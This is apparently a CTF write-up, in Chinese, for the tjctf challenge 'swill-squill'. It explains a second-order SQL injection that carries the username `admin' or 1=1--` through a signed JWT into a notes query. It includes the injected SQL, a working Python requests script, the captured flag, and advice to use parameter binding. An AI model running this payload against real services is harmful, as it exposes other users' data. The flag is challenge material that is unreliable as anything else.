# swill-squill

## 题目简述

注册接口只禁止用户名精确等于 `admin`，随后把用户名直接拼入 SQLite 查询；生成的 JWT 又原样保存该用户名。访问 `/api` 时，服务再次把 token 中的用户名拼入 notes 查询，因此可以让注入字符串跨注册与认证流程进入第二条 SQL。

## 解题过程

注册以下用户名：

```text
admin' or 1=1--
```

注册阶段执行的查询变为：

```sql
SELECT * FROM users WHERE name == 'admin' or 1=1--';
```

它会返回已有用户，服务不再插入新记录，但已经在响应 cookie 中签发了包含该 `name` 的合法 JWT。随后访问 `/api`，notes 查询变为：

```sql
SELECT description FROM notes WHERE owner == 'admin' or 1=1--';
```

从而返回所有 notes，包括管理员保存 flag 的记录：

```python
import os
import requests

session = requests.Session()
session.post(
    "https://TARGET/register",
    data={"name": "admin' or 1=1--", "grade": os.urandom(8).hex()},
    timeout=10,
)
page = session.get("https://TARGET/api", timeout=10).text
print(page[page.index("tjctf{"):page.index("}", page.index("tjctf{")) + 1])
```

输出为：

```text
tjctf{swill_sql_1y1029345029374}
```

## 方法总结

- 合法签名的 JWT 只证明字段由服务签发，不代表字段适合直接进入 SQL；不可信字符串经过 token 往返后仍然不可信。
- 第一条注入既不需要创建账号，也不需要伪造 token，它的作用是让恶意用户名获得服务端签名并进入第二个 sink。
- 所有查询都应使用参数绑定；精确禁止 `admin` 不能替代输入处理和授权校验。
